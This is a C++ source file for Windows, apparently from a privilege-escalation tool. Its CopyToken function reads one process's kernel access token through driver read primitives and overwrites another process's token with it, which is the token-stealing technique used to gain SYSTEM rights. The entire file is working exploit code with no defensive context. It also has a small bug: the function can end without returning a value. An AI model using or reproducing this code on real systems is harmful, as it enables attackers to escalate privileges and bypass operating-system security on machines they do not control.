#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include "DriverOps.h"
#include "FindOffset.h"
#include "TokenCopy.h"



bool CopyToken(DWORD SrcPid, DWORD DstPid) {
	ULONG_PTR pSrcProcess, pDstProcess;
	UCHAR bSrcToken, bDstToken;
	UCHAR bProtectionLevel, bSignerType;

	BYTE SrcToken[8], DstToken[8];


	if (!GetProcessKernelAddress(SrcPid, &pSrcProcess))
		return false;
	for (int i = 0; i < 8; i++) {
		Read8(pSrcProcess + GetOffsets().TokenOffset + i, &bSrcToken);
		SrcToken[i] = bSrcToken;
	}
	EX_FAST_REF* SrcTokenObj = (EX_FAST_REF*)(void*)SrcToken;

	printf("Got token at %p for process %d\n", SrcTokenObj->Object, SrcPid);


	if (!GetProcessKernelAddress(DstPid, &pDstProcess))
		return false;
	for (int i = 0; i < 8; i++) {
		Read8(pDstProcess + GetOffsets().TokenOffset + i, &bDstToken);
		DstToken[i] = bDstToken;
	}
	EX_FAST_REF* DstTokenObj = (EX_FAST_REF*)(void*)DstToken;

	printf("Got token at %p for process %d\n", DstTokenObj->Object, DstPid);


	DstTokenObj->Value = SrcTokenObj->Value;
	BYTE newtoken[8];
	std::memcpy(newtoken, DstTokenObj, 8);
	for (int i = 0; i < 8; i++)
	{
		DWORD NewTokenData = newtoken[i];
		Write8(pDstProcess + GetOffsets().TokenOffset + i, NewTokenData);
	}

}
